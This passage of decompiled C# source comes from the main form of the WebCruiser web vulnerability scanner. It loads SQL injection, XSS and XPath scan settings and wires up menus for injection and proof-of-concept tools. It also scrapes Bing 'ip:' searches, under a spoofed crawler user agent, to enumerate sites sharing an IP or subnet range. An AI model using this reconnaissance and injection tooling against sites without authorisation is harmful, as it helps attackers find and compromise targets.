			this.contextMenuStrip1.ResumeLayout(false);
			this.groupBox6.ResumeLayout(false);
			this.groupBox6.PerformLayout();
			this.tabPage9.ResumeLayout(false);
			this.tabPage3.ResumeLayout(false);
			this.tabPage3.PerformLayout();
			this.groupBox4.ResumeLayout(false);
			this.groupBox7.ResumeLayout(false);
			this.groupBox7.PerformLayout();
			this.tabPage6.ResumeLayout(false);
			this.groupBox13.ResumeLayout(false);
			this.groupBox13.PerformLayout();
			this.groupBox10.ResumeLayout(false);
			this.groupBox10.PerformLayout();
			this.groupBox9.ResumeLayout(false);
			this.groupBox9.PerformLayout();
			this.groupBox3.ResumeLayout(false);
			this.groupBox3.PerformLayout();
			this.tabPage4.ResumeLayout(false);
			this.contextMenuStrip4.ResumeLayout(false);
			this.tabPage5.ResumeLayout(false);
			this.tabPage5.PerformLayout();
			this.tabPage7.ResumeLayout(false);
			this.groupBox8.ResumeLayout(false);
			this.groupBox8.PerformLayout();
			this.tabPage8.ResumeLayout(false);
			this.tabPage8.PerformLayout();
			this.tabControl1.ResumeLayout(false);
			this.tabPage10.ResumeLayout(false);
			this.tabPage10.PerformLayout();
			this.contextMenuStrip5.ResumeLayout(false);
			this.contextMenuStrip6.ResumeLayout(false);
			base.ResumeLayout(false);
		}
		private void InitSetting()
		{
			WCRSetting.UseProxy = WebCruiserWVS.Default.UseProxy;
			WCRSetting.ProxyAddress = WebCruiserWVS.Default.ProxyAddress;
			WCRSetting.ProxyPort = WebCruiserWVS.Default.ProxyPort;
			WCRSetting.ProxyUsername = WebCruiserWVS.Default.ProxyUsername;
			WCRSetting.ProxyPassword = WebCruiserWVS.Default.ProxyPassword;
			WCRSetting.UserAgent = WebCruiserWVS.Default.UserAgent;
			WCRSetting.MaxHTTPThreadNum = WebCruiserWVS.Default.MaxHTTPThread;
			ThreadPool.SetMaxThreads(WCRSetting.MaxHTTPThreadNum + 10, (WCRSetting.MaxHTTPThreadNum + 10) * 2);
			WCRSetting.SecondsDelay = WebCruiserWVS.Default.SecondsDelay;
			WCRSetting.ScanSQLInjection = WebCruiserWVS.Default.ScanSQLInjection;
			WCRSetting.ScanXSS = WebCruiserWVS.Default.ScanXSS;
			WCRSetting.ScanXPathInjection = WebCruiserWVS.Default.ScanXPathInjection;
			WCRSetting.ScanURLSQL = WebCruiserWVS.Default.ScanURLSQL;
			WCRSetting.ScanPostSQL = WebCruiserWVS.Default.ScanPostSQL;
			WCRSetting.ScanCookieSQL = WebCruiserWVS.Default.ScanCookieSQL;
			WCRSetting.chkReplace1 = WebCruiserWVS.Default.chkReplace1;
			WCRSetting.FiltExpr1 = WebCruiserWVS.Default.FiltExpr1;
			WCRSetting.RepExpr1 = WebCruiserWVS.Default.RepExpr1;
			WCRSetting.chkReplace2 = WebCruiserWVS.Default.chkReplace2;
			WCRSetting.FiltExpr2 = WebCruiserWVS.Default.FiltExpr2;
			WCRSetting.RepExpr2 = WebCruiserWVS.Default.RepExpr2;
			WCRSetting.chkReplace3 = WebCruiserWVS.Default.chkReplace3;
			WCRSetting.FiltExpr3 = WebCruiserWVS.Default.FiltExpr3;
			WCRSetting.RepExpr3 = WebCruiserWVS.Default.RepExpr3;
			WCRSetting.Edition = WebCruiserWVS.Default.Edition;
			WCRSetting.ScanDepth = WebCruiserWVS.Default.ScanDepth;
			WCRSetting.CrawlableExt = WebCruiserWVS.Default.CrawlableExt;
			WCRSetting.MultiSitesNum = WebCruiserWVS.Default.MultiSitesNum;
			WCRSetting.CrossSiteURL = WebCruiserWVS.Default.CrossSiteURL;
			WCRSetting.CrossSiteRecord = WebCruiserWVS.Default.CrossSiteRecord;
		}
		private void InitTextAd()
		{
			this.AdTimer.Enabled = false;
		}
		private void LoadFromXmlDocument(XmlDocument WcrXml)
		{
			try
			{
				this.ScannerForm.LoadFromXmlDocument(WcrXml);
				this.SQLForm.LoadFromXmlDocument(WcrXml);
				this.URL = WcrXml.SelectSingleNode("//ROOT/CurrentSite/URL").Attributes["Value"].Value;
				string reqType = WcrXml.SelectSingleNode("//ROOT/CurrentSite/RequestType").Attributes["Value"].Value;
				this.UpdateComboReqType(reqType);
				this.ReqType = (RequestType)Enum.Parse(typeof(RequestType), reqType);
				this.SubmitData = WcrXml.SelectSingleNode("//ROOT/CurrentSite/SubmitData").Attributes["Value"].Value;
				this.CurrentSite.WebRoot = WcrXml.SelectSingleNode("//ROOT/CurrentSite/WebRoot").Attributes["Value"].Value;
				WebSite.EscapeCookie = bool.Parse(WcrXml.SelectSingleNode("//ROOT/CurrentSite/EscapeCookie").Attributes["Value"].Value);
				this.CookieForm.EscapeCookie(WebSite.EscapeCookie);
			}
			catch
			{
			}
		}
		private void MenuItemAbout_Click(object sender, EventArgs e)
		{
			this.SelectTool("About");
		}
		private void MenuItemCheckUpdate_Click(object sender, EventArgs e)
		{
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.CheckUpdate));
		}
		private void MenuItemCookie_Click(object sender, EventArgs e)
		{
			this.SelectTool("Cookie");
		}
		private void MenuItemDBEncoding_Click(object sender, EventArgs e)
		{
			try
			{
				((ToolStripMenuItem)sender).Checked = true;
				this.CurrentSite.DBEncoding = Encoding.GetEncoding(((ToolStripMenuItem)sender).Text);
			}
			catch (Exception exception)
			{
				MessageBox.Show(exception.Message);
			}
		}
		private void MenuItemEscapeCookie_Click(object sender, EventArgs e)
		{
		}
		private void MenuItemFeedback_Click(object sender, EventArgs e)
		{
			try
			{
				Process.Start("mailto:janusecurity@gmail.com");
			}
			catch
			{
			}
		}
		private void MenuItemNew_Click(object sender, EventArgs e)
		{
			this.NewScan();
		}
		private void MenuItemOnlineHelp_Click(object sender, EventArgs e)
		{
			string fileName = "";
			try
			{
				Process.Start(fileName);
			}
			catch
			{
				this.NavigatePage(fileName, RequestType.GET, "");
			}
		}
		private void MenuItemOpen_Click(object sender, EventArgs e)
		{
			this.OpenWVSData();
		}
		private void MenuItemOrder_Click(object sender, EventArgs e)
		{
			string fileName = "";
			try
			{
				Process.Start(fileName);
			}
			catch
			{
				this.NavigatePage(fileName, RequestType.GET, "");
			}
		}
		private void MenuItemRefreshURL_Click(object sender, EventArgs e)
		{
		}
		private void MenuItemReport_Click(object sender, EventArgs e)
		{
			this.SelectTool("Report");
		}
		private void MenuItemResend_Click(object sender, EventArgs e)
		{
			this.SelectTool("Resend");
		}
		private void MenuItemSave_Click(object sender, EventArgs e)
		{
			this.SaveWVSData(false);
		}
		private void MenuItemSaveAs_Click(object sender, EventArgs e)
		{
			this.SaveWVSData(true);
		}
		private void MenuItemScanner_Click(object sender, EventArgs e)
		{
			this.SelectTool("Scanner");
		}
		private void MenuItemSetting_Click(object sender, EventArgs e)
		{
			this.SelectTool("Setting");
		}
		private void MenuItemSettings_Click(object sender, EventArgs e)
		{
			this.SelectTool("Setting");
		}
		private void MenuItemSQLInjection_Click(object sender, EventArgs e)
		{
			this.SelectTool("SQL");
		}
		private void MenuItemTextAd_Click(object sender, EventArgs e)
		{
			try
			{
				Process.Start(this.TextAdURL);
			}
			catch
			{
			}
		}
		private void MenuItemTextAd_MouseLeave(object sender, EventArgs e)
		{
			this.Cursor = Cursors.Arrow;
		}
		private void MenuItemTextAd_MouseMove(object sender, MouseEventArgs e)
		{
			this.Cursor = Cursors.Hand;
		}
		private void MenuItemWebBrowser_Click(object sender, EventArgs e)
		{
			this.SelectTool("WebBrowser");
		}
		private void MenuItemWebEncoding_Click(object sender, EventArgs e)
		{
			try
			{
				((ToolStripMenuItem)sender).Checked = true;
				this.CurrentSite.WebEncoding = Encoding.GetEncoding(((ToolStripMenuItem)sender).Text);
			}
			catch (Exception exception)
			{
				MessageBox.Show(exception.Message);
			}
		}
		private void MenuItemWebsite_Click(object sender, EventArgs e)
		{
			string fileName = "";
			try
			{
				Process.Start(fileName);
			}
			catch
			{
				this.NavigatePage(fileName, RequestType.GET, "");
			}
		}
		private void MenuItemXSS_Click(object sender, EventArgs e)
		{
			this.SelectTool("XSS");
		}
		public void NavigatePage(string sURL, RequestType ReqType, string SubmitData)
		{
			this.SelectTool("WebBrowser");
			this.BrowserForm.NavigatePage(sURL, ReqType, SubmitData);
		}
		private void NewScan()
		{
			string arg_0A_0 = Process.GetCurrentProcess().ProcessName;
			Process.Start(Application.ExecutablePath);
		}
		private void OpenWVSData()
		{
			OpenFileDialog dialog = new OpenFileDialog
			{
				Filter = "XML File(*.xml)|*.xml",
				InitialDirectory = Application.StartupPath
			};
			DialogResult result = dialog.ShowDialog();
			string fileName = dialog.FileName;
			dialog.Dispose();
			if (result == DialogResult.OK)
			{
				this.CurrentSite.WcrXml.Load(fileName);
				this.CurrentSite.WcrFileName = fileName;
				this.LoadFromXmlDocument(this.CurrentSite.WcrXml);
				this.WebBrowserGo();
			}
		}
		private void SaveWVSData(bool IsSaveAs)
		{
			this.UpdateXMLData(this.CurrentSite.WcrXml);
			string str = this.CurrentSite.Save(IsSaveAs);
			if (!string.IsNullOrEmpty(str))
			{
				this.DisplayProgress(str + " Saved!");
			}
		}
		private void ScanTimer_Tick(object sender, EventArgs e)
		{
			this.DisplayThreadNum("HTTP Thread: " + this.CurrentSite.HTTPThreadNum.ToString());
			DateTime now = DateTime.Now;
			if (now.Subtract(WebSite.StopTime).Seconds > 8 && WebSite.CurrentStatus == TaskStatus.Stop)
			{
				WebSite.CurrentStatus = TaskStatus.Ready;
				this.CurrentSite.HTTPThreadNum = 0;
			}
			TimeSpan span = now.Subtract(this.CurrentSite.LastGetTime);
			if (span.Seconds > 30 && this.CurrentSite.HTTPThreadNum == 0)
			{
				this.DisplayProgress("Done");
			}
			if (span.Seconds > 30 && this.CurrentSite.HTTPThreadNum > 0)
			{
				this.CurrentSite.HTTPThreadNum = 0;
			}
		}
		public void SelectCode(int Location, int Length)
		{
			this.CodeForm.SelectCode(Location, Length);
		}
		public void SelectTool(string ToolName)
		{
			switch (ToolName)
			{
			case "WebBrowser":
				this.HideAllToolForm();
				this.BrowserForm.Show();
				this.BrowserForm.SelectTabByName("tabBrowser");
				return;
			case "Scanner":
				this.HideAllToolForm();
				this.ScannerForm.Show();
				return;
			case "POCTool":
			case "SystemTool":
				return;
			case "SQL":
				this.HideAllToolForm();
				this.SQLForm.Show();
				this.SQLForm.SelectTabByName("tabEnv");
				return;
			case "XSS":
				this.HideAllToolForm();
				this.XSSForm.Show();
				return;
			case "Code":
				this.HideAllToolForm();
				this.CodeForm.Show();
				return;
			case "Cookie":
				this.HideAllToolForm();
				this.CookieForm.Show();
				return;
			case "Setting":
				this.HideAllToolForm();
				this.SettingForm.Show();
				return;
			case "Admin":
				this.HideAllToolForm();
				this.AdminForm.Show();
				return;
			case "Report":
				this.HideAllToolForm();
				this.ReportForm.Show();
				return;
			case "Resend":
				this.HideAllToolForm();
				this.BrowserForm.Show();
				this.BrowserForm.SelectTabByName("tabResend");
				return;
			case "StringTool":
				this.HideAllToolForm();
				this.SQLForm.Show();
				this.SQLForm.SelectTabByName("tabEscapeString");
				return;
			case "About":
				this.HideAllToolForm();
				this.AboutForm.Show();
				return;
			}
			MessageBox.Show("Not Handled");
		}
		private void SetTextBoxText(FormMain.TxtBoxInfo txtBoxInfo)
		{
			try
			{
				if (!txtBoxInfo.txtBox.InvokeRequired)
				{
					txtBoxInfo.txtBox.Text = txtBoxInfo.Text;
				}
				else
				{
					FormMain.ddSetTextBox method = new FormMain.ddSetTextBox(this.SetTextBoxText);
					base.Invoke(method, new object[]
					{
						txtBoxInfo
					});
				}
			}
			catch (Exception exception)
			{
				MessageBox.Show(exception.Message);
			}
		}
		private void toolStripBtnGo_Click(object sender, EventArgs e)
		{
			this.WebBrowserGo();
		}
		private void toolStripBtnPause_Click(object sender, EventArgs e)
		{
			if (WebSite.CurrentStatus == TaskStatus.Ready)
			{
				WebSite.CurrentStatus = TaskStatus.Pause;
				this.DisplayProgress("PAUSE");
				return;
			}
			if (WebSite.CurrentStatus == TaskStatus.Pause)
			{
				WebSite.CurrentStatus = TaskStatus.Ready;
			}
		}
		private void toolStripBtnStop_Click(object sender, EventArgs e)
		{
			WebSite.CurrentStatus = TaskStatus.Stop;
			this.DisplayProgress("Terminating Threads... ");
			WebSite.StopTime = DateTime.Now;
		}
		private void toolStripButtonBrowser_Click(object sender, EventArgs e)
		{
			this.SelectTool("WebBrowser");
		}
		private void toolStripButtonNew_Click(object sender, EventArgs e)
		{
			this.NewScan();
		}
		private void toolStripButtonOpen_Click(object sender, EventArgs e)
		{
			this.OpenWVSData();
		}
		private void toolStripButtonReport_Click(object sender, EventArgs e)
		{
			this.SelectTool("Report");
		}
		private void toolStripButtonSave_Click(object sender, EventArgs e)
		{
			this.SaveWVSData(false);
		}
		private void toolStripButtonScanner_Click(object sender, EventArgs e)
		{
			this.SelectTool("Scanner");
		}
		private void toolStripButtonSetting_Click(object sender, EventArgs e)
		{
			this.SelectTool("Setting");
		}
		private void toolStripButtonSQL_Click(object sender, EventArgs e)
		{
			this.SelectTool("SQL");
		}
		private void toolStripButtonXSS_Click(object sender, EventArgs e)
		{
			this.SelectTool("XSS");
		}
		private void treeViewToolTree_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
		{
			Point pt = new Point(e.X, e.Y);
			string name = this.treeViewToolTree.GetNodeAt(pt).Name;
			this.SelectTool(name);
		}
		private void txtSubmitData_DoubleClick(object sender, EventArgs e)
		{
			this.txtSubmitData.SelectAll();
		}
		private void txtSubmitData_KeyPress(object sender, KeyPressEventArgs e)
		{
			if (e.KeyChar == '\r')
			{
				this.WebBrowserGo();
			}
		}
		private void txtURL_DoubleClick(object sender, EventArgs e)
		{
			this.txtURL.SelectAll();
		}
		private void txtURL_KeyPress(object sender, KeyPressEventArgs e)
		{
			if (e.KeyChar == '\r')
			{
				this.WebBrowserGo();
			}
		}
		public void UpdateCodeText(string Code)
		{
			this.CodeForm.UpdateCodeText(Code);
		}
		private void UpdateComboReqType(string ReqType)
		{
			if (!this.toolStripURL.InvokeRequired)
			{
				this.cmbReqType.SelectedIndex = this.cmbReqType.FindString(ReqType);
				return;
			}
			FormMain.dd method = new FormMain.dd(this.UpdateComboReqType);
			base.Invoke(method, new object[]
			{
				ReqType
			});
		}
		public void UpdateKeyWordText(string ItemText)
		{
			this.SQLForm.UpdateKeyWordText(ItemText);
		}
		public void UpdateSubmitData(string SubmitData)
		{
			if (!this.toolStripData.InvokeRequired)
			{
				this.txtSubmitData.Text = SubmitData;
				return;
			}
			FormMain.dd method = new FormMain.dd(this.UpdateSubmitData);
			base.Invoke(method, new object[]
			{
				SubmitData
			});
		}
		private void UpdateTextBoxText(TextBox txtBox, string Text)
		{
			FormMain.TxtBoxInfo info;
			info.txtBox = txtBox;
			info.Text = Text;
			this.SetTextBoxText(info);
		}
		public void UpdateURLText(string URLText)
		{
			if (!this.toolStripURL.InvokeRequired)
			{
				this.txtURL.Text = URLText;
				return;
			}
			FormMain.dd method = new FormMain.dd(this.UpdateURLText);
			base.Invoke(method, new object[]
			{
				URLText
			});
		}
		public void UpdateXMLData(XmlDocument WcrXml)
		{
			try
			{
				XmlNode node = WcrXml.SelectSingleNode("//ROOT");
				XmlDocument currentSiteXml = this.GetCurrentSiteXml();
				XmlNode newChild = WcrXml.ImportNode(currentSiteXml.SelectSingleNode("//ROOT/CurrentSite"), true);
				XmlNode oldChild = WcrXml.SelectSingleNode("//ROOT/CurrentSite");
				if (oldChild == null)
				{
					node.AppendChild(newChild);
				}
				else
				{
					node.ReplaceChild(newChild, oldChild);
				}
				XmlDocument xmlDocumentFromDirTree = this.ScannerForm.GetXmlDocumentFromDirTree();
				XmlNode node2 = WcrXml.ImportNode(xmlDocumentFromDirTree.SelectSingleNode("//ROOT/SiteDirTree"), true);
				XmlNode node3 = WcrXml.SelectSingleNode("//ROOT/SiteDirTree");
				if (node3 == null)
				{
					node.AppendChild(newChild);
				}
				else
				{
					node.ReplaceChild(node2, node3);
				}
				XmlDocument xmlDocumentFromWVS = this.ScannerForm.GetXmlDocumentFromWVS();
				XmlNode node4 = WcrXml.ImportNode(xmlDocumentFromWVS.SelectSingleNode("//ROOT/SiteVulList"), true);
				XmlNode node5 = WcrXml.SelectSingleNode("//ROOT/SiteVulList");
				if (node5 == null)
				{
					node.AppendChild(node4);
				}
				else
				{
					node.ReplaceChild(node4, node5);
				}
				XmlDocument xmlDocumentFromDBTree = this.SQLForm.GetXmlDocumentFromDBTree();
				XmlNode node6 = WcrXml.ImportNode(xmlDocumentFromDBTree.SelectSingleNode("//ROOT/SiteDBStructure"), true);
				XmlNode node7 = WcrXml.SelectSingleNode("//ROOT/SiteDBStructure");
				if (node7 == null)
				{
					node.AppendChild(node6);
				}
				else
				{
					node.ReplaceChild(node6, node7);
				}
				XmlDocument xmlDocumentFromEnv = this.SQLForm.GetXmlDocumentFromEnv();
				XmlNode node8 = WcrXml.ImportNode(xmlDocumentFromEnv.SelectSingleNode("//ROOT/SiteSQLEnv"), true);
				XmlNode node9 = WcrXml.SelectSingleNode("//ROOT/SiteSQLEnv");
				if (node9 == null)
				{
					node.AppendChild(node8);
				}
				else
				{
					node.ReplaceChild(node8, node9);
				}
			}
			catch (Exception exception)
			{
				MessageBox.Show(exception.Message);
			}
		}
		public void URLTextBoxFocus()
		{
			this.txtURL.Focus();
		}
		private void WebBrowserGo()
		{
			this.SelectTool("WebBrowser");
			string uRLText = this.txtURL.Text.Trim();
			this.CurrentSite.URL = uRLText;
			string postData = "";
			string scanData = this.CurrentRequestType.ToString() + "  " + uRLText;
			if (this.CurrentRequestType != RequestType.GET)
			{
				postData = this.txtSubmitData.Text;
				scanData = scanData + "^" + postData;
				if (this.CurrentRequestType == RequestType.POST)
				{
					postData = this.CurrentSite.ConvertPostData(postData);
				}
			}
			else
			{
				if (uRLText.IndexOf('^') > 0)
				{
					if (MessageBox.Show("* URL is not a valid for GET Request.\r\n* Do you want it switch to POST?\r\n", "Confirm", MessageBoxButtons.OKCancel, MessageBoxIcon.Asterisk) == DialogResult.Cancel)
					{
						return;
					}
					string[] strArray = uRLText.Split(new char[]
					{
						'^'
					});
					uRLText = strArray[0];
					string str4 = "";
					for (int i = 1; i < strArray.Length; i++)
					{
						if (!string.IsNullOrEmpty(str4))
						{
							str4 += "^";
						}
						str4 += strArray[i];
					}
					this.CurrentRequestType = RequestType.POST;
					this.InitByRequestType(this.CurrentRequestType);
					this.UpdateURLText(uRLText);
					this.UpdateSubmitData(str4);
					postData = this.txtSubmitData.Text;
					postData = this.CurrentSite.ConvertPostData(postData);
				}
			}
			this.BrowserForm.NavigatePage(uRLText, this.CurrentRequestType, postData);
			if (WebSite.LogScannedURL)
			{
				WebSite.LogScannedData(scanData);
			}
		}
		public void XPathPOC(string RefURL, string XPathForm, string Parameter)
		{
			this.BrowserForm.XPathPOC(RefURL, XPathForm, Parameter);
		}
		public void XSSPOC(string RefPage, string ActionURL)
		{
			this.XSSForm.XSSPOC(RefPage, ActionURL);
		}
		private void splitMain_Panel2_Paint(object sender, PaintEventArgs e)
		{
		}
		private void treeViewToolTree_AfterSelect(object sender, TreeViewEventArgs e)
		{
		}
		private void button13_Click(object sender, EventArgs e)
		{
			try
			{
				string url = this.textBox3.Text;
				if (url.Contains("http://"))
				{
					url = url.Replace("http://", "");
					if (url.Contains("/"))
					{
						url = url.Substring(0, url.IndexOf("/"));
					}
					this.textBox3.Text = url;
				}
				if (url == "")
				{
					MessageBox.Show("请输入域名！");
				}
				else
				{
					MatchCollection matchs = new Regex("^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$", RegexOptions.None).Matches(url);
					IEnumerator enumerator = matchs.GetEnumerator();
					try
					{
						if (enumerator.MoveNext())
						{
							Match arg_9B_0 = (Match)enumerator.Current;
							this.textBox1.Text = url;
							return;
						}
					}
					finally
					{
						IDisposable disposable = enumerator as IDisposable;
						if (disposable != null)
						{
							disposable.Dispose();
						}
					}
					this.fuwuqishibie(url);
					IPHostEntry dnstoip = new IPHostEntry();
					dnstoip = Dns.Resolve(url);
					for (int i = 0; i < dnstoip.AddressList.Length; i++)
					{
						this.textBox1.Text = dnstoip.AddressList[i].ToString();
						this.label34.Text = dnstoip.AddressList[i].ToString();
					}
				}
			}
			catch
			{
				MessageBox.Show("解析失败！");
			}
		}
		private void EndGetwebsite(IAsyncResult arResult)
		{
			GC.Collect();
		}
		public void getwebsite()
		{
			string jiaoben = this.comboBox1.SelectedItem.ToString();
			this.listBox1.Items.Clear();
			string text = this.textBox1.Text;
			WebClient client = new WebClient();
			client.Headers.Add("User-Agent", "BaiduSpider");
			client.Headers.Remove(HttpRequestHeader.Connection);
			client.Encoding = Encoding.UTF8;
			string shuliang = "1";
			int wangzhanchaxunjishu = 0;
			for (int i = 0; i <= 8; i++)
			{
				string input;
				if (jiaoben == "All")
				{
					if (i == 0)
					{
						input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=1&" + shuliang).Replace("\r", " ").Replace("\n", " ");
					}
					else
					{
						if (i == 1)
						{
							input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=51&").Replace("\r", " ").Replace("\n", " ");
						}
						else
						{
							if (i == 2)
							{
								input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=101&").Replace("\r", " ").Replace("\n", " ");
							}
							else
							{
								if (i == 3)
								{
									input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=151&").Replace("\r", " ").Replace("\n", " ");
								}
								else
								{
									if (i == 4)
									{
										input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=201").Replace("\r", " ").Replace("\n", " ");
									}
									else
									{
										if (i == 5)
										{
											input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=251").Replace("\r", " ").Replace("\n", " ");
										}
										else
										{
											input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=401").Replace("\r", " ").Replace("\n", " ");
										}
									}
								}
							}
						}
					}
				}
				else
				{
					if (i == 0)
					{
						input = client.DownloadString("http://cn.bing.com/search?count=50&first=1&&q=ip:" + text + " " + jiaoben).Replace("\r", " ").Replace("\n", " ");
					}
					else
					{
						if (i == 1)
						{
							input = client.DownloadString("http://cn.bing.com/search?count=50&first=51&&q=ip:" + text + " " + jiaoben).Replace("\r", " ").Replace("\n", " ");
						}
						else
						{
							if (i == 2)
							{
								input = client.DownloadString("http://cn.bing.com/search?count=50&first=101&&q=ip:" + text + " " + jiaoben).Replace("\r", " ").Replace("\n", " ");
							}
							else
							{
								if (i == 3)
								{
									input = client.DownloadString("http://cn.bing.com/search?count=50&first=151&&q=ip:" + text + " " + jiaoben).Replace("\r", " ").Replace("\n", " ");
								}
								else
								{
									if (i == 4)
									{
										input = client.DownloadString("http://cn.bing.com/search?count=50&first=201&q=ip:" + text + " " + jiaoben).Replace("\r", " ").Replace("\n", " ");
									}
									else
									{
										if (i == 5)
										{
											input = client.DownloadString("http://cn.bing.com/search?count=50&first=251&q=ip:" + text + " " + jiaoben).Replace("\r", " ").Replace("\n", " ");
										}
										else
										{
											input = client.DownloadString("http://cn.bing.com/search?count=50&first=401&q=ip:" + text + " " + jiaoben).Replace("\r", " ").Replace("\n", " ");
										}
									}
								}
							}
						}
					}
				}
				MatchCollection matchs = new Regex("<h2><a.*?href=\"(?<url>.*?)\".*?>(?<content>.*?)</a>", RegexOptions.None).Matches(input);
				foreach (Match match in matchs)
				{
					wangzhanchaxunjishu++;
					string text2 = match.Value;
					if (text2.Length > 20)
					{
						text2 = text2.Substring(20, text2.Length - 20);
					}
					int wangzhijieshu = text2.IndexOf("/");
					int biaotikaishi = text2.IndexOf(">");
					int biaotijieshu = text2.IndexOf("</a>");
					string wangzhi = text2.Substring(0, wangzhijieshu);
					string biaoti = text2.Substring(biaotikaishi + 1, biaotijieshu - biaotikaishi - 1);
					string str3 = wangzhi;
					ListViewItem item = new ListViewItem();
					item.Text = (this.listView1.Items.Count + 1).ToString();
					item.SubItems.Add(wangzhi);
					item.SubItems.Add(biaoti);
					string baohan = "0";
					for (int i2 = 0; i2 < this.listView1.Items.Count; i2++)
					{
						string aaa = this.listView1.Items[i2].SubItems[1].Text;
						if (aaa == wangzhi)
						{
							baohan = "1";
						}
					}
					if (baohan == "0")
					{
						if (!this.listView1.Items.Contains(item))
						{
							this.listView1.Items.Add(item);
						}
					}
					if (!str3.Contains("-") && !str3.Contains("bing") && !str3.Contains("w3.org") && !str3.Contains("live.com") && !str3.Contains("microsoft") && !str3.Contains("msn.com") && !str3.Contains("soso.com") && str3.Length > 5 && !str3.Contains("weibo.com") && !str3.Contains("iyiyun.com") && !this.listBox1.Items.Contains(str3) && str3 != this.textBox1.Text)
					{
						this.listBox1.Items.Add(str3);
						this.jindu++;
						this.SetTextMessage(100 * this.jindu / this.jindutiaozongshu);
					}
				}
			}
			this.SetTextMessage(this.jindutiaozongshu * 100 / this.jindutiaozongshu);
			this.label5.Text = this.listBox1.Items.Count.ToString() + "查询完成";
		}
		public void scan()
		{
			string aa = this.textBox8.Text;
			MatchCollection matchs = new Regex("((\\d+\\.\\d+\\.\\d+\\.)(\\d+))", RegexOptions.None).Matches(aa);
			foreach (Match match in matchs)
			{
				string ip = this.textBox9.Text;
				string urls = match.Groups[2].ToString();
				int a = Convert.ToInt32(match.Groups[3].ToString());
				int b = 0;
				MatchCollection matchs2 = new Regex("((\\d+\\.\\d+\\.\\d+\\.)(\\d+))", RegexOptions.None).Matches(ip);
				foreach (Match match2 in matchs2)
				{
					b = Convert.ToInt32(match2.Groups[3].ToString());
				}
				this.cduanzongshu = b - a;
				for (int c = a; c <= b; c++)
				{
					ThreadPool.SetMaxThreads(500, 500);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.getCwebsite), urls + c.ToString());
				}
			}
		}
		public void getCwebsite(object text)
		{
			try
			{
				WebClient client = new WebClient();
				client.Headers.Add("User-Agent", "BaiduSpider");
				client.Headers.Remove(HttpRequestHeader.Connection);
				client.Encoding = Encoding.UTF8;
				string shuliang = "1";
				int wangzhanchaxunjishu = 0;
				string jiaoben = this.comboBox2.SelectedItem.ToString();
				for (int i = 0; i <= 8; i++)
				{
					string input;
					if (jiaoben == "All")
					{
						if (i == 0)
						{
							input = client.DownloadString(string.Concat(new object[]
							{
								"http://cn.bing.com/search?count=50&q=ip:",
								text,
								"&first=1&",
								shuliang
							})).Replace("\r", " ").Replace("\n", " ");
						}
						else
						{
							if (i == 1)
							{
								input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=51&").Replace("\r", " ").Replace("\n", " ");
							}
							else
							{
								if (i == 2)
								{
									input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=101&").Replace("\r", " ").Replace("\n", " ");
								}
								else
								{
									if (i == 3)
									{
										input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=151&").Replace("\r", " ").Replace("\n", " ");
									}
									else
									{
										if (i == 4)
										{
											input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=201").Replace("\r", " ").Replace("\n", " ");
										}
										else
										{
											if (i == 5)
											{
												input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=251").Replace("\r", " ").Replace("\n", " ");
											}
											else
											{
												input = client.DownloadString("http://cn.bing.com/search?count=50&q=ip:" + text + "&first=401").Replace("\r", " ").Replace("\n", " ");
											}
										}
									}
								}
							}
						}
					}
					else
					{
						if (i == 0)
						{
							input = client.DownloadString(string.Concat(new object[]
							{
								"http://cn.bing.com/search?count=50&first=1&&q=ip:",
								text,
								" ",
								jiaoben
							})).Replace("\r", " ").Replace("\n", " ");
						}
						else
						{
							if (i == 1)
							{
								input = client.DownloadString(string.Concat(new object[]
								{
									"http://cn.bing.com/search?count=50&first=51&&q=ip:",
									text,
									" ",
									jiaoben
								})).Replace("\r", " ").Replace("\n", " ");
							}
							else
							{
								if (i == 2)
								{
									input = client.DownloadString(string.Concat(new object[]
									{
										"http://cn.bing.com/search?count=50&first=101&&q=ip:",
										text,
										" ",
										jiaoben
									})).Replace("\r", " ").Replace("\n", " ");
								}
								else
								{
									if (i == 3)
									{
										input = client.DownloadString(string.Concat(new object[]
										{
											"http://cn.bing.com/search?count=50&first=151&&q=ip:",
											text,
											" ",
											jiaoben
										})).Replace("\r", " ").Replace("\n", " ");
									}
									else
									{
										if (i == 4)
										{
											input = client.DownloadString(string.Concat(new object[]
											{
												"http://cn.bing.com/search?count=50&first=201&q=ip:",
												text,
												" ",
												jiaoben
											})).Replace("\r", " ").Replace("\n", " ");
										}
										else
										{
											if (i == 5)
											{
												input = client.DownloadString(string.Concat(new object[]
												{
													"http://cn.bing.com/search?count=50&first=251&q=ip:",
													text,
													" ",
													jiaoben
												})).Replace("\r", " ").Replace("\n", " ");
											}
											else
											{
												input = client.DownloadString(string.Concat(new object[]
												{
													"http://cn.bing.com/search?count=50&first=401&q=ip:",
													text,
													" ",
													jiaoben
												})).Replace("\r", " ").Replace("\n", " ");
											}
										}
									}
								}
							}
						}
					}
					MatchCollection matchs = new Regex("<h2><a.*?href=\"(?<url>.*?)\".*?>(?<content>.*?)</a>", RegexOptions.None).Matches(input);
					if (matchs.Count == 0)
					{
						this.cduanjishu++;
						this.houtaiSetTextc(this.cduanjishu * 100 / this.cduanzongshu);
						Thread.CurrentThread.Abort();
						break;
					}
					foreach (Match match in matchs)
					{
						try
						{
							string tingzhi = Settings.Default.CduanIsStop;
							if (tingzhi == "1")
							{
								Settings.Default.CduanIsStop = "0";
								Settings.Default.Save();
								Thread.CurrentThread.Abort();
								return;
							}
							wangzhanchaxunjishu++;
							string text2 = match.Value;
							if (text2.Length > 20)
							{
